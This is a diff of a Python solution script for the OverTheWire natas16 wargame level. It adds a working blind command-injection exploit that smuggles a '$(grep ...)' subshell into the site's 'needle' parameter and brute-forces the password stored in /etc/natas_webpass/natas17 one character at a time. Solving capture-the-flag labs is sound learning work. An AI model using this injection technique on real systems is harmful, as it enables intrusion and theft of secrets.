@@ -5,6 +5,8 @@ import json
 import re
 import base64
 import sys
+import urllib
+import urllib.parse
 
 # natas17 solution
 
@@ -14,18 +16,39 @@ headers = {
 }
 
 #grep -i "one$(grep ^hella file.txt)" dictionary.txt
-
-query_prefix = "one$(grep ^"
+standin = "Christians"
+query_prefix = standin + "$(grep ^"
 password = ""
 query_suffix = " /etc/natas_webpass/natas17)"
-character_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+legal_chars_string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+example_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
 
-#curl -X POST https://www.hackthebox.eu/api/invite/generate
+def tryletter(prefix, letter):
+    # print("-----------------------------------------------------")
+    # print("making request")
 
-response = requests.get(url, headers=headers)
-print(response)
+    query_url = "http://natas16.natas.labs.overthewire.org/?needle=" + urllib.parse.quote_plus(query_prefix + prefix + letter + query_suffix)
+    # print(query_url)
 
-# jsonResponse = response.json()
-# code = jsonResponse["data"]["code"]
-# decodedCode = base64.b64decode(code)
-# print(decodedCode)
+    response = requests.get(query_url, headers=headers)
+    # print(response.text)
+
+    # print(response.status)
+    # print("-----------------------------------------------------")
+
+    if re.search(standin, response.text):
+        return False
+
+    return True
+
+def split(word):
+    return [char for char in word]
+
+legal_chars = split(legal_chars_string)
+prefix = ""
+while len(prefix) < len(example_password):
+    for char in legal_chars:
+        if tryletter(prefix, char):
+            prefix += char
+            break
+    print("prefix: " + prefix)
